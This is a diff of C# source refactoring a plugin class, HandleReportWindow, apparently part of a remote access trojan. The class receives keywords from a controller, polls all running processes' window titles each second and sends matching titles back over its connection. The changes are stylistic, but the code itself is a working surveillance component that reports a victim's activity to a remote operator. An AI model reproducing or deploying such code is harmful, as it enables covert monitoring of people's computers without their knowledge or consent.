@@ -1,14 +1,13 @@
-﻿using MessagePackLib.MessagePack;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
-using System.Text;
 using System.Threading;
+using MessagePackLib.MessagePack;
 
 namespace Plugin.Handler
 {
-    class HandleReportWindow
+    internal class HandleReportWindow
     {
         private List<string> title;
 
@@ -16,39 +15,42 @@ namespace Plugin.Handler
         {
             switch (unpack_msgpack.ForcePathObject("Option").AsString)
             {
-
                 case "run":
+                {
+                    try
                     {
-                        try
+                        Initialize(unpack_msgpack);
+                        var count = 30;
+                        while (!Packet.ctsReportWindow.IsCancellationRequested)
                         {
-                            Initialize(unpack_msgpack);
-                            int count = 30;
-                            while (!Packet.ctsReportWindow.IsCancellationRequested)
+                            foreach (var window in Process.GetProcesses())
                             {
-                                foreach (Process window in Process.GetProcesses())
+                                if (string.IsNullOrEmpty(window.MainWindowTitle))
+                                    continue;
+                                if (title.Any(window.MainWindowTitle.ToLower().Contains) && count > 30)
                                 {
-                                    if (string.IsNullOrEmpty(window.MainWindowTitle))
-                                        continue;
-                                    if (title.Any(window.MainWindowTitle.ToLower().Contains) && count > 30)
-                                    {
-                                        count = 0;
-                                        SendReport(window.MainWindowTitle.ToLower());
-                                    }
+                                    count = 0;
+                                    SendReport(window.MainWindowTitle.ToLower());
                                 }
-                                count++;
-                                Thread.Sleep(1000);
                             }
+
+                            count++;
+                            Thread.Sleep(1000);
                         }
-                        catch { break; }
-                        break;
                     }
+                    catch
+                    {
+                    }
+
+                    break;
+                }
 
                 case "stop":
-                    {
-                        Packet.ctsReportWindow?.Cancel();
-                        Connection.Disconnected();
-                        break;
-                    }
+                {
+                    Packet.ctsReportWindow?.Cancel();
+                    Connection.Disconnected();
+                    break;
+                }
             }
         }
 
@@ -57,24 +59,23 @@ namespace Plugin.Handler
             Packet.ctsReportWindow?.Cancel();
             Packet.ctsReportWindow = new CancellationTokenSource();
 
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "reportWindow-";
             Connection.Send(msgpack.Encode2Bytes());
 
             title = new List<string>();
-            foreach (string s in unpack_msgpack.ForcePathObject("Title").AsString.ToLower().Split(new[] { "," }, StringSplitOptions.None))
+            foreach (var s in unpack_msgpack.ForcePathObject("Title").AsString.ToLower()
+                         .Split(new[] { "," }, StringSplitOptions.None))
                 title.Add(s.Trim());
         }
 
         private void SendReport(string window)
         {
             Debug.WriteLine(window);
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "reportWindow";
             msgpack.ForcePathObject("Report").AsString = window;
             Connection.Send(msgpack.Encode2Bytes());
         }
-
     }
-
 }
